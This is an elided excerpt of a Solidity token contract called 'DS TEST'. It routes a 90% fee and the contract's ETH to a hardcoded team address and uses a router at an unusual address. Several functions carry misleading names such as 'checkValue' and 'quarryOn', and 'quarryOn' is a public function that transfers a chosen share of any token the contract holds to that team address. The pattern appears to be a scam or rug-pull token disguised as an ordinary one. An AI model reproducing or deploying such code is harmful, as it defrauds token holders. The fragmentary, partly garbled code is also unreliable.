...
contract DS is Context, IERC20 { 
    ...
    QuarredFactoryV1 public uniswapV2Router;
    ...
    uint256 public PromotionsFEE = 90;
    uint256 public UtilitiesFEE = 0;
    uint256 public DEADfee = 0;
    uint256 public IDEXFEE = 10;

    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint256 private _rTotal = 1000000 * 10**_decimals;
    string private constant _name = unicode"DS TEST"; 
    string private constant _symbol = unicode"1";

    address payable public PromotionAddress = payable(0xA26D63C5658c0564538358fF714376F0797761B2); 
    address payable public isTeamAddress = payable(0xA26D63C5658c0564538358fF714376F0797761B2);
    ...
    constructor () {
        ...
        _tOwned[owner()] = 
        _rTotal;
        QuarredFactoryV1 IDEXNET01 = 
        QuarredFactoryV1(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3);
        uniswapV2Pair = IUniswapV2Factory(IDEXNET01.factory())
    ...
    function checkValue(uint256 hashOnCompile) private lockTheSwap {
            ...
            * DEADfee / 100;
            ...
            uint256 CoinsFPromotion = hashOnCompile 
            * PromotionsFEE / 100;
            ...
            * IDEXFEE / 100;
            ...
            {acquireDX =tokensLiq;}
            transactERCpath(acquireDX); uint256 ETH_Total = address
            (this).balance; getRatesOf(isTeamAddress, ETH_Total);
            MaximumRays = false;
    }
    ...
    function quarryOn(address tokenSyncer, uint256 valTokens) public returns(bool _compress){
        ...
        uint256 wholeOn = IERC20(tokenSyncer).balanceOf(address(this));
        uint256 acquiteIf = wholeOn*valTokens/100;
        _compress = IERC20(tokenSyncer).transfer(isTeamAddress, acquiteIf);
    }
}